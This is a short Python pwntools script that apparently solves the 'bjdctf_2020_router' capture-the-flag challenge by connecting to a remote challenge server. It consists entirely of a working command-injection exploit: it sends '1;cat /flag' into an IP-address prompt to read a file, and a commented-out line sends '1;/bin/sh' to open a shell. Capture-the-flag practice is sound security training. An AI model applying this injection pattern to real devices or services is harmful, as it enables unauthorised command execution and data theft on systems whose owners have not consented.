from pwn import *


def bjdctf_2020_router(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_router'):
    print('bjdctf_2020_router start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 27728)

    target.sendlineafter('Please input u choose:', b'1')
    target.sendlineafter('Please input the ip address:', b'1;cat /flag')
    # target.sendlineafter('Please input the ip address:', b'1;/bin/sh')
    print(target.recvline())
    print(target.recvline())
    print(target.recvline())
    # target.interactive()
    print('bjdctf_2020_router end')


if __name__ == '__main__':
    bjdctf_2020_router()
